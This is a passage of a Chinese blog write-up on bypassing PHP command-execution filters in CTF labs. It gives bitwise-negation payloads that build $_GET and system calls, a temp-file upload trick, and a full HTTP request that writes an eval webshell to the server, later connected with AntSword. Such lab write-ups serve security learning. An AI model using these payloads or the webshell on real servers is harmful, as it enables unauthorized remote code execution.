<h2 id="0x23无字母数字特殊符号过滤-php7"><a href="#0x23无字母数字特殊符号过滤-php7" class="headerlink" title="0x23无字母数字特殊符号过滤(php7)"></a>0x23无字母数字特殊符号过滤(php7)</h2><h3 id="无字母数字下划线"><a href="#无字母数字下划线" class="headerlink" title="无字母数字下划线"></a>无字母数字下划线</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429205338573.png" alt="image-20250429205338573"></p>
<p>短标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>GET方式提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;   -&gt;   ?&gt;&lt;?=`$_GET[%a0]`?&gt;   取反</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=ls</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429210335757.png" alt="image-20250429210335757"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`?&gt;   -&gt;   ?&gt;&lt;?`$_POST[-]`?&gt;   取反</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`?&gt;</span><br><span class="line">POST:   -=ls</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429210803038.png" alt="image-20250429210803038"></p>
<h3 id="无字母数字下划线及-符号过滤"><a href="#无字母数字下划线及-符号过滤" class="headerlink" title="无字母数字下划线及$符号过滤"></a>无字母数字下划线及$符号过滤</h3><h4 id="PHP7-3"><a href="#PHP7-3" class="headerlink" title="PHP7"></a>PHP7</h4><p>($a)()  式执行</p>
<p>利用call_user_func()  函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()  -&gt;%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system  -&gt;  %8c%86%8c%8b%9a%92</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / -&gt;%93%8c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%93%8c,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429211443415.png" alt="image-20250429211443415"></p>
<h4 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5"></a>PHP5</h4><p>文化读取</p>
<p>php中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp目录下</p>
<p>默认文件名是phpxxxxxx，文件名最后6个字符是随机的大小写字母。</p>
<p>. &#x2F;???&#x2F;?????????   ?通配符，可以匹配到. &#x2F;tmp&#x2F;phpxxxxxx    能匹配东西太多，通常会报错</p>
<p>. &#x2F;???&#x2F;????????[@-[]   [@-[]表示ASCII在@和[之间的字符，也就是大写字母，保障最后一位为大写字母</p>
<p>一：先构造一个文件上传的POST数据包</p>
<p>二：PHP页面生成临时文件phpxxxxxx，存储在&#x2F;tmp目录下；</p>
<p>三：执行指令. &#x2F;???&#x2F;????????[@-[],  读取文件，执行其中指令；</p>
<p>四：在上传的文件中写入一句话木马，把木马生成位置知道一个绝对路径，直接执行：</p>
<p>在docker内监控文件</p>
<p>&#x2F;tmp# inotifywait -m &#x2F;tmp&#x2F;</p>
<p>bp修改数据包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure>

<p>数据包不知道是什么可以通过下面这个网页传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://192.168.248.130:18080/class11/3.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>保存为  .html文件  用浏览器打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429214636196.png" alt="image-20250429214636196"></p>
<p>随便提交一个文件   用burpsuite进行抓包  然后再去修改文件内容就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429220014180.png" alt="image-20250429220014180"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429214954630.png" alt="image-20250429214954630"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /class11/3.php?cmd=?%3e%3c?=`.+/%3f%3f%3f%2f%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3e HTTP/1.1</span><br><span class="line">Host: 192.168.248.130:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=----geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Length: 416</span><br><span class="line">Origin: null</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.txt&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot;?\&gt; &gt;/www/admin/localhost_80/wwwroot/class11/shell.php</span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429215028692.png" alt="image-20250429215028692"></p>
<p>这里发现已经写入成功了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429220028405.png" alt="image-20250429220028405"></p>
<p>下面可以用antsword连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429220105762.png" alt="image-20250429220105762"></p>
<h3 id="无字母数字过滤"><a href="#无字母数字过滤" class="headerlink" title="无字母数字过滤;~^&#96;&amp;|"></a>无字母数字过滤;~^&#96;&amp;|</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095757027.jpg" alt="Screenshot_20250429_220158"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095808750.jpg" alt="Screenshot_20250429_220201"></p>
<h3 id="无字母数字-只获得数字？"><a href="#无字母数字-只获得数字？" class="headerlink" title="无字母数字  只获得数字？"></a>无字母数字  只获得数字？</h3><p>例题  NSSCTF  [LitCTF 2024]百万美元的诱惑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250522111128934.png" alt="image-20250522111128934"></p>
<p>在linux里   输入$(())可以构造出0   对其进行取反$((~$(())))就可以构造出1</p>
<p>原理是对二进制取反   00000000-&gt;0  取反  11111111 -&gt;-1</p>
<p>将两个-1合在一起取反  ~(-2)-&gt; 1</p>
<p>即$((<del>$(($((</del>$(())))$((~$(())))))))</p>
<p>这里可以  用  -13取反为12</p>
<p>也可以是-2取反为1   和-3取反为2  再合并</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=$((~$(($(($((~$(())))$((~$(())))))))))$((~$(($((~$(())))$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>还可以</p>
<ul>
<li><code>$$</code>表示当前运行进程的进程号，并且注意到<code>/</code>没有被拦截</li>
<li><code>$(())</code>里面可以包裹并计算数学表达式，则</li>
<li>做个简单除法<code>$$/$$</code>即为1，<code>$$/$$+$$/$$</code>即为2。则exp有了：<code>$(($$/$$))$(($$/$$+$$/$$))</code>?x&#x3D;$(($$&#x2F;$$))$(($$&#x2F;$$+$$&#x2F;$$))</li>
</ul>
<p>url编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=%24((%24%24%2F%24%24))%24((%24%24%2F%24%24%2B%24%24%2F%24%24))</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723094953412.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723094953412.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">达达</div><div class="post-copyright__author_desc">与其等风来 不如追风去</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html')">php命令执行</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=php命令执行&amp;url=http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html&amp;pic=https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250809165008358.gif" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dada-06.github.io" target="_blank">永远自由如风 永远为自己着迷</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/phptop10/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>phptop10<span class="categoryesPageCount">3</span></a><a class="post-meta__box__categoryes" href="/categories/phptop10/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>橙子科技<span class="categoryesPageCount">2</span></a></div><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/phptop10/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>phptop10<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>橙子科技<span class="tagsPageCount">1</span></a></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20251125190644004.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/16120.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803205146771.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow xxe</div></div></a></div><div class="next-post pull-right"><a href="/posts/TGCTF.html"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723153452457.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TGCTF web</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723094953412.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">欢迎来到魔法信息堡, 希望你在这里找到所需的知识和教程, 开启一段充满魔法的奇妙之旅!</div></div></div><div class="card-widget" id="card-poem"><div id="poem_sentence"></div><div id="poem_info"><div id="poem_dynasty"></div><div id="poem_author"></div></div></div><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js" charset="utf-8"></script><script type="text/javascript">jinrishici.load(function(result) {
var sentence = document.querySelector("#poem_sentence")
var author = document.querySelector("#poem_author")
var dynasty = document.querySelector("#poem_dynasty")

var sentenceText = result.data.content
sentenceText = sentenceText.substr(0, sentenceText.length - 1);
sentence.innerHTML = sentenceText
dynasty.innerHTML = result.data.origin.dynasty
author.innerHTML = result.data.origin.author + '《' + result.data.origin.title + '》'
});</script><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01命令执行函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">system  有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E5%9B%9E%E6%98%BE%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8C"><span class="toc-text">exec  回显最后一行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">passthru   有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">shell_exec  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">popen  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#command"><span class="toc-text">command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-open-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">proc_open  无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4-%E8%BF%87"><span class="toc-text">0x02替换绕过函数过滤(过)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="toc-text">0x03LD_PRELOAD绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04mail-%E5%87%BD%E6%95%B0%E5%91%BD%E4%BB%A4"><span class="toc-text">0x04mail()函数命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%E8%9A%81%E5%89%91%E5%8F%8Apcntl%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-text">0x05蚁剑及pcntl绕过函数过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#antsword"><span class="toc-text">antsword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcntl-exec"><span class="toc-text">pcntl_exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="toc-text">0x06操作系统链接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81-26"><span class="toc-text">&amp;   URL编码  %26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-text">|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-text">||</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">0x07.空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E6%8B%AC%E5%8F%B7-cat-flag-txt"><span class="toc-text">1.大括号{cat,flag.txt};</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IFS%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%EF%BC%9B-IFS%E3%80%81-IFS-%E3%80%81-IFS-9"><span class="toc-text">2.$IFS代替空格；$IFS、${IFS}、$IFS$9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="toc-text">3.重定向字符 &lt;, &lt;&gt;;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-09-Tab-20-space"><span class="toc-text">4.%09(Tab),%20(space);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">0x08.文件名过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6-%E7%BB%95%E8%BF%87"><span class="toc-text">1.通配符  ?  * 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">2.单引号、双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%8D%E6%96%9C%E6%9D%A0-%E7%BB%95%E8%BF%87"><span class="toc-text">3.反斜杠  \   绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F-1%E5%88%B0-9%E3%80%81-%E5%92%8C-%E7%AD%89"><span class="toc-text">4.特殊变量:  $1到$9、$@和$*等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-text">5.内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">6.利用linux中的环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-text">0x09.常见文件读取目录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tac%EF%BC%9A%E5%8F%8D%E5%90%91%E6%98%BE%E7%A4%BA"><span class="toc-text">1.tac：反向显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-more-%E4%B8%80%E9%A1%B5%E4%B8%80%E9%A1%B5%E7%9A%84%E6%98%BE%E7%A4%BA%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9"><span class="toc-text">2.more:一页一页的显示档案内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-less%EF%BC%9A%E4%B8%8Emore%E7%B1%BB%E4%BC%BC"><span class="toc-text">3.less：与more类似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-tail%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%9C%AB%E5%B0%BE%E5%87%A0%E8%A1%8C%EF%BC%9B"><span class="toc-text">4.tail：查看末尾几行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-nl%EF%BC%9A%E6%98%BE%E7%A4%BA%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E9%A1%BA%E4%BE%BF%E8%BE%93%E5%87%BA%E8%A1%8C%E5%8F%B7"><span class="toc-text">5.nl：显示的时候，顺便输出行号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-od%EF%BC%9A%E4%BB%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AF%BB%E5%8F%96%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9%EF%BC%9B"><span class="toc-text">6.od：以二进制的方式读取档案内容；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-xxd%EF%BC%9A%E8%AF%BB%E5%8F%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-text">7.xxd：读取二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-sort%EF%BC%9A%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E6%8E%92%E5%BA%8F%E6%96%87%E4%BB%B6%EF%BC%9B"><span class="toc-text">8.sort：主要用于排序文件；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-uniq%EF%BC%9A%E6%8A%A5%E5%91%8A%E6%88%96%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E8%A1%8C%EF%BC%9B"><span 